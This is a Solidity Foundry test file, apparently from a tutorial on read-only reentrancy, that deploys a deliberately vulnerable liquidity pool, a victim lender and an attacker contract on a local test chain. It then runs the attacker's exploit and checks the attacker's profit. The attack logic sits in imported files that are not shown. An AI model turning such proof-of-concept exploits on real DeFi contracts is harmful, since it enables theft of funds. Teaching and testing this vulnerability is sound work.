// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/04-readOnly.sol";
import "../src/04-template_attacker.sol";
import "../src/periphery_contracts/reader_lender.sol";
import "../src/periphery_contracts/steth_token.sol";
import "../src/periphery_contracts/lp_token.sol";


contract ProofOfConcept is Test {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");  
    uint256 public constant USR_PARTICIPATION = 10 ether;    

    VulnerableLiquidityPool public pool;
    ReaderLender public victim_reader;
    SyntheticETH public stEth;
    LPToken public lp_token;
    Attacker public attacker;
    address public alice;


    // The setUp() function will be run before each test to set the initial scenario
    function setUp() public {
        // Declaring our contracts
        stEth = new SyntheticETH(); 
        lp_token = new LPToken();
        pool = new VulnerableLiquidityPool(address(stEth), address(lp_token));        
        victim_reader = new ReaderLender(address(stEth), address(pool));
        attacker = new Attacker(address(stEth), address(pool), address(victim_reader));
        alice = makeAddr("liq_provider"); // Initial liquidity provider
        // Initial set up
        lp_token.grantRole(MINTER_ROLE, address(pool));
        lp_token.grantRole(BURNER_ROLE, address(pool)); 
        // Labelling for test traces
        vm.label(address(pool), "vulnerable_pool_contract");   
        vm.label(address(stEth), "stEth");
        vm.label(address(victim_reader), "victim_contract");      
        vm.label(address(attacker), "attacker_contract");
        // Funding both parties
        vm.deal(address(attacker), 2 ether); // It is not necessary to fund the attacker as you could just send eth along, but still
        stEth.mint(address(attacker), 2e18); 
        vm.deal(address(victim_reader), 100 ether);
        stEth.mint(address(victim_reader), 100e18); 
        vm.deal(alice, 1 ether); 
        stEth.mint(alice, 1e18);
        // Simulare legitimate users's usage
        vm.prank(alice);
        stEth.approve(address(pool), 1e18);
        vm.prank(alice);
        pool.addLiquidity{value: 1 ether}(1 ether, 1e18);
        console.log("[>] Initial pool state: %s eth, %s stEth | Spotprice %s", 
            toEth(address(pool).balance), 
            toEth(stEth.balanceOf(address(pool))), 
            toEth(pool.getSpotPriceEth(1 ether))
        );          
    }

    // Foundry tests should start with the word "test" to be recognized as such
    function test_exploit() public {
        console.log(unicode"\n   📚📚 All things reentrancy: read-only exploitation\n");
        console.log("--------------------------------------------------------");
        console.log(unicode"| => Attacker's added balance 👀 %s (ETH + stETH) 👀", 
            toEth(
                address(attacker).balance +  
                stEth.balanceOf(address(attacker))
            )
        );
        console.log(unicode"|       %s ETH | %s stETH", 
            toEth(address(attacker).balance),
            toEth(stEth.balanceOf(address(attacker)))
        );   
        console.log("--------------------------------------------------------"); 

        console.log(unicode"\n\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n");            

        attacker.exploit();  
        
        // Conditions to fullfill
        assertEq(stEth.balanceOf(address(attacker)), 3e18);
        assertEq(address(attacker).balance, 1483333333333333334); 

        console.log("--------------------------------------------------------"); 
        console.log(unicode"| => Attacker's added balance 💯 %s (ETH + stETH) 💯", 
            toEth(
                address(attacker).balance +  
                stEth.balanceOf(address(attacker))
            )
        );   
        console.log(unicode"|       %s ETH | %s stETH", 
            toEth(address(attacker).balance),
            toEth(stEth.balanceOf(address(attacker)))
        );     
        console.log("--------------------------------------------------------");                 
    }


    function toEth(uint256 _wei) internal pure returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        string memory result = string.concat(
            string.concat(eth, "."),
            decs
        );

        return result;
    }      
}
